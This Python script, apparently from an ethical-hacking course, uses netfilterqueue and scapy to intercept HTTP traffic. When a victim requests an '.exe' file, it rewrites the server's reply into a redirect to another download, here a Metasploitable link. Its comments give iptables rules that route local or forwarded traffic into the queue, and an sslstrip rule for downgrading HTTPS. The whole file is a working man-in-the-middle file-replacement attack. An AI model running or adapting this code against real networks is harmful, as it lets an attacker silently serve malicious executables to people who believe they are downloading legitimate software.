#!/usr/bin/env python
#Terminal command to test on local machine: iptables -I OUTPUT -j NFQUEUE --queue-num 0
#Terminal command to test on local machine: iptables -I INPUT -j NFQUEUE --queue-num 0
#Terminal commmand to test on other nodes: iptables -I FORWARD -j NFQUEUE --queue-num 0
#Remove IP Table rules: iptables --flush
#To use ssl-strip use the following command: iptables -t nat PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
	#sslstrip uses port 10000 by default
	#change port 80 to 10000, and combine with INPUT OUTPUT
import netfilterqueue
import scapy.all as scapy

def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

ack_list = []
def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:

            if ".exe" in scapy_packet[scapy.Raw].load and "server ip" not in scapy_packet[scapy.Raw].load:
                print("[+] Exe Request: ")
                ack_list.append(scapy_packet[scapy.TCP].ack)

                print(scapy_packet.show())
        elif scapy_packet[scapy.TCP].sport == 80:
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing file: ")
                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: http://sourceforge.net/projects/metasploitable/files/latest/download\n\n")
                packet.set_payload(str(modified_packet))

        #print(scapy_packet.show())




    packet.accept()
try:
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()
except KeyboardInterrupt:
    print("\n\n[+] Good Bye")
